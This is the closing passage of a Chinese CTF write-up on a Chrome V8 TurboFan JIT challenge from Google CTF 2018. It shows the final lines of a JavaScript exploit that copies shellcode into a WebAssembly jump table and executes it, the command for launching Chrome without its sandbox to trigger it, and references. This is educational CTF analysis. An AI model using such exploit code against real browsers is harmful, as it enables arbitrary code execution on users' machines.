        write_8bytes(JumpTableStartAddr + BigInt(i), shellcode[i]);
    // 执行shellcode
    console.log("[+] try to execute shellcode ... ");
    WasmJSFunction();
&lt;/script&gt;
</code></pre>
使用如下命令以执行exp:
<pre><code class="lang-cpp hljs">chrome/chrome --no-sandbox --user-data-dir=./userdata http://127.0.0.1:8000/test.html
</code></pre>
<blockquote>尽管给出的附件打了no-sandbox的patch，但实际exp仍然无法执行，必须附加参数`--no-sandbox`才能成功触发，玄学问题XD。</blockquote>
效果如下：
[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01ad52e2c5f477467a.png)
</li>
> 尽管给出的附件打了no-sandbox的patch，但实际exp仍然无法执行，必须附加参数`--no-sandbox`才能成功触发，玄学问题XD。



## 七、参考
1. [Introduction to TurboFan](https://doar-e.github.io/blog/2019/01/28/introduction-to-turbofan/)
1. [google-ctf-2018-browser-pwn分析](https://de4dcr0w.github.io/google-ctf-2018-browser-pwn%E5%88%86%E6%9E%90.html)
1. [Why I failed to trigger Bound Check Elimination in Google CTF 2018 Final JIT](https://mem2019.github.io/jekyll/update/2019/08/09/Google-CTF-2018-Final-JIT.html)
1. [Google CTF justintime writeup – 先知社区](https://xz.aliyun.com/t/3348?spm=5176.12901015.0.i12901015.1bc1525cy9bvzk)